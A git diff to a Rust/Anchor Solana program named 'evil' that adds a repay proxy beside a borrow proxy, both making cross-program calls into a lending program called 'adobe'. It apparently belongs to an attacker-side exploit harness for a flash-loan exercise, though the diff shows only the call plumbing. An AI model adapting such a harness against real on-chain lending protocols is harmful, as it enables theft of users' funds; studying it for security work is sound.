@@ -1,5 +1,5 @@
 use anchor_lang::prelude::*;
-use adobe::cpi::accounts::Borrow;
+use adobe::cpi::accounts::{ Borrow, Repay};
 
 declare_id!("5zAQ1XhjuHcQtUXJSTjbmyDagmKVHDMi5iADv5PfYEUK");
 
@@ -24,12 +24,22 @@ pub mod evil {
 
         Ok(())
     }
+
+    pub fn repay_proxy(ctx: Context<Adobe>, amount: u64) -> ProgramResult {
+        msg!("evil repay_proxy");
+
+        adobe::cpi::repay(ctx.accounts.into_repay_context(), amount)?;
+
+        Ok(())
+    }
 }
 
 #[derive(Accounts)]
 pub struct Adobe<'info> {
-    #[account(mut)]
+    #[account(mut, signer)]
+    pub user: AccountInfo<'info>,
     pub state: AccountInfo<'info>,
+    #[account(mut)]
     pub pool: AccountInfo<'info>,
     pub pool_token: AccountInfo<'info>,
     pub user_token: AccountInfo<'info>,
@@ -48,6 +58,20 @@ impl<'info> Adobe<'info> {
                 pool_token: self.pool_token.clone(),
                 user_token: self.user_token.clone(),
                 instructions: self.instructions.clone(),
+                token_program: self.token_program.clone(),
+            },
+        )
+    }
+
+    fn into_repay_context(&self) -> CpiContext<'_, '_, '_, 'info, Repay<'info>> {
+        CpiContext::new(
+            self.adobe_program.clone(),
+            Repay {
+                user: self.user.clone(),
+                state: self.state.clone(),
+                pool: self.pool.clone(),
+                pool_token: self.pool_token.clone(),
+                user_token: self.user_token.clone(),
                 token_program: self.token_program.clone(),
             },
         )
